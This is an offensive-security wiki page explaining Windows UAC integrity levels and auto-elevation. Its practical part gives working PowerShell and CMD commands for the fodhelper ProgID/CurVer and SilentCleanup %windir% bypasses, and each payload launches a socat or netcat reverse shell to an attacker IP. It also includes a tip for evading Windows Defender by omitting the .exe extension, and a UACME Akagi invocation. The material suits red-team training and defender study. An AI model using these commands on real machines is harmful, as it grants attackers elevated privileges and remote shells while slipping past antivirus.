---
description: 'MITRE ATT&CK™ Impair Defenses: Disable or Modify Tools - Technique T1562.001'
---

# UAC Bypass

## Theory

The User Account Control [UAC](https://learn.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works). Its a Windows security feature that forces any new process to run in the security context of a non-privileged account by default..

### Integrity Levels

UAC is a **Mandatory Integrity Control** (MIC), which is a mechanism that allows differentiating users, processes and resources by assigning an Integrity Level (IL) to each of them. In general terms, users or processes with a higher IL access token will be able to access resources with lower or equal ILs. MIC takes precedence over regular Windows DACLs\
The following 4 ILs are used by Windows, ordered from lowest to highest:

| Integrity Level | Use                                                |
| --------------- | -------------------------------------------------- |
| Low             | Very limited permissions                           |
| Medium          | users and Administrators' filtered tokens.         |
| High            | Administrators' elevated tokens if UAC is enabled. |
| System          | Reserved for system use.                           |

### AutoElevate

some executables can auto-elevate, achieving high IL without any user intervention. This applies to most of the Control Panel's functionality and some executables provided with Windows. For an application, some requirements need to be met to auto-elevate:\
\- The executable must be signed by the Windows Publisher\
\- The executable must be contained in a trusted directory, like %SystemRoot%/System32/ or %ProgramFiles%/\
\- Executable files (.exe) must declare the autoElevate element inside their manifests. To check a file's manifest, we can use sigcheck.

Indeed we can leverage this executables to bypass UAC. Let's dive in:

{% hint style="danger" %}
if UAC is configured on the "Always Notify" level, fodhelper and similar apps won't be of any use as they will require the user to go through the UAC prompt to elevate.
{% endhint %}

## Practice

Microsoft doesn't consider UAC a security boundary but rather a simple convenience to the administrator to avoid unnecessarily running processes with administrative privileges. In that sense any bypass technique is not considered a vulnerability to Microsoft, and therefore some of them remain unpatched to this day.

### Using ProgID and AutoElevate binary to bypass UAC

We will create an entry on the registry for a new `progID` of our choice (any name will do) and then point the `CurVer` entry in the `ms-settings progID` to our newly created progID. This way, when `fodhelper` tries opening a file using the `ms-settings progID`, it will notice the `CurVer` entry pointing to our new `progID` and check it to see what command to use.

{% tabs %}
{% tab title="Powershell" %}
The exploit code is proposed by [V3ded](https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses)

```bash
# Using socat
$program = "powershell -windowstyle hidden C:\tools\socat\socat TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
# Or using netcat
$program = "powershell -windowstyle hidden C:\Windows\Temp\nc64 192.168.49.113 443 -e cmd.exe"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
    
New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
    
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

{% hint style="danger" %}
Detected by Windowds Defender

Note that we removed the `.exe` extension in an attempt to evade Windows Defender (e.g. using `nc64` instead of `nc64.exe`). By omitting the extension, Windows will still execute the binary.
{% endhint %}

We may clean-up as follows

```powershell
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```
{% endtab %}

{% tab title="CMD" %}
V3ded exploit converted in CMD by TryHackMe

```bash
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

C:\> reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
The operation completed successfully.

C:\> reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
The operation completed successfully.

C:\> fodhelper.exe
```
{% endtab %}
{% endtabs %}

### DiskCleanup Scheduled Task to bypass UAC

Originally discovered [discovered in 2017](https://www.tiraniddo.dev/2017/05/exploiting-environment-variables-in.html) by [James Forshaw](https://twitter.com/tiraniddo) from [Google Project Zero](https://googleprojectzero.blogspot.com/), the "DiskCleanup Bypass" take advantage of the `SilentCleanup` scheduled task, which is configured on Windows by default.This tasks can be started from a process with a `medium integrity level`, and then automatically elevates to a `high integrity level` since the `"Run with highest privileges"` option is enabled.&#x20;

**SilentCleanup launches `cleanmgr.exe` using the `%windir%` environment variable**. By modifying `%windir%`, we can control what gets executed.

{% tabs %}
{% tab title="PowerShell" %}
We can abuse it as follows

```bash
Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value "cmd.exe /K C:\Windows\Tasks\nc64.exe <IP> <PORT> & REM " -Force
Start-ScheduledTask -TaskPath "\Microsoft\Windows\DiskCleanup" -TaskName "SilentCleanup"
```

We may clean-up as follows

```powershell
Clear-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Force
```
{% endtab %}

{% tab title="CMD" %}
We can abuse it as follows

```powershell
reg add "HKCU\Environment" /v windir /t REG_SZ /d "cmd.exe /K C:\Windows\Tasks\nc64.exe <IP> <PORT> & REM " /f
schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

We may clean-up as follows

```powershell
reg delete "HKCU\Environment" /v windir /f
```
{% endtab %}
{% endtabs %}

### Automated Exploitation

{% tabs %}
{% tab title="UACME" %}
While [UACME](https://github.com/hfiref0x/UACME) provides several tools, we will focus mainly on the one called **Akagi**, which runs the actual UAC bypasses\
If you want to test for method 33, you can do the following from a command prompt, and a high integrity cmd.exe will pop up:

```bash
C:\tools>UACME-Akagi64.exe 33
```

| Method Id | Bypass technique                        |
| --------- | --------------------------------------- |
| 33        | fodhelper.exe                           |
| 34        | DiskCleanup scheduled task              |
| 70        | fodhelper.exe using CurVer registry key |
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://tryhackme.com/room/bypassinguac" %}

{% embed url="https://github.com/hfiref0x/UACME" %}

{% embed url="https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses" %}
